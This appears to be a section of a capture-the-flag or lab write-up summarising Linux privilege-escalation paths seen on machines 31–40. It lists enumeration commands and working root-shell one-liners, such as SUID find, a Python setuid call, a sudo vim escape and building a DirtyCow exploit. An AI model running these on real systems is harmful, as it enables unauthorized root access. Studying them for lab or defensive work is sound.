## 🛡️ Privilege Escalation (Machines 31–40)

```bash
# Enumeration
sudo -l                                 # Check user sudo rights
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
getcap -r / 2>/dev/null                 # Check Linux capabilities
ps aux | grep root                      # Check running processes
env                                     # Look for injected variables
cat /etc/crontab                        # Look for cronjobs
```

### Techniques Observed

- **SUID Binaries Abuse**: Several machines had SUID binaries like `/usr/bin/nmap`, `/usr/bin/python`, or custom ones like `chkrootkit`, allowing privilege escalation via known methods.
- **Writable Scripts in Cron**: Machines had root-owned cron jobs executing writable scripts, allowing privilege escalation by inserting malicious commands.
- **Sudo Misconfigurations**: Users allowed to run `awk`, `vim`, `less`, or even custom binaries via `sudo` without password.
- **Kernel Exploits**: Kernel versions were identified as vulnerable (e.g., 4.15.0, 5.4.0). Exploits like `overlayfs` or `dirtycow` were applicable.
- **Capabilities Abuse**: Binaries like Python, Perl, or tar had file capabilities allowing execution as elevated user.
- **LXD Exploitation**: On some machines, users were members of the `lxd` group, enabling container-based privilege escalation.
- **Environment Variables**: Exploiting environment variables via `LD_PRELOAD`, `PATH`, or `PYTHONPATH` injection in misconfigured setups.

### Notable Commands Used

```bash
# SUID Exploit
/usr/bin/find . -exec /bin/sh \;        # When find has SUID

# Python Capability
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Vim Escape via Sudo
sudo vim -c '!bash'

# DirtyCow (if applicable)
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

> ✅ Machines showed a wide range of privilege escalation paths: from misconfigured cron jobs and SUID abuse to kernel exploits and file capabilities.
